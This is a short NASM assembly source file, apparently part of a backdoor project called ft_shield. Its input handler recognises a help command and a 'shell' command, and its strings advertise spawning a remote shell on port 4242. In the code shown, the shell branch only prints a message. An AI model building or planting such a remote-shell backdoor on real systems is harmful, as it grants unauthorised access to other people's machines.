%include "ft_shield.inc"

section .data
	HELP_CMD dd "?", 0
	HELP_CMD_LEN equ $ - HELP_CMD
	SHELL_CMD dd "shell", 0
	SHELL_CMD_LEN equ $ - SHELL_CMD
	HELP dd "? show help", 10, "shell Spawn remote shell on 4242", 10, 10
	HELP_LEN equ $ - HELP
	SHELL dd "Spawning shell on port 4242", 10
	SHELL_LEN equ $ - SHELL

section .text
	global handle_input
	extern ft_strcmp

handle_input:
	mov rdi, buff
	mov rsi, HELP_CMD
	call ft_strcmp
	cmp rax, 0
	je .show_help
	mov rdi, buff
	mov rsi, SHELL_CMD
	call ft_strcmp
	cmp rax, 0
	je .show_shell
	ret
.show_help:
	print r13, HELP, HELP_LEN
	ret
.show_shell:
	print r13, SHELL, SHELL_LEN
	ret